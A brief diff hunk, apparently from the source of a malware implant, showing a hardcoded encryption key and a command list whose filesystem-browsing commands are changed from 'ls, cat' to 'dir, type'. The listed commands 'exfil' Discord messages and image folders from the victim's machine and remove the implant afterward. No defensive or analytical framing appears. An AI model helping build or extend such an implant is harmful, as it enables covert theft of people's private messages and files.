@@ -70,7 +70,7 @@ key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x1
 
 '''
 Commands:
-1. ls, cat: to browse filesystem
+1. dir, type: to browse filesystem
 2. exfil: to exfil discord messages
 3. exfil path/to/images: to exfil images 
 4. remove: to remove implant from filesystem
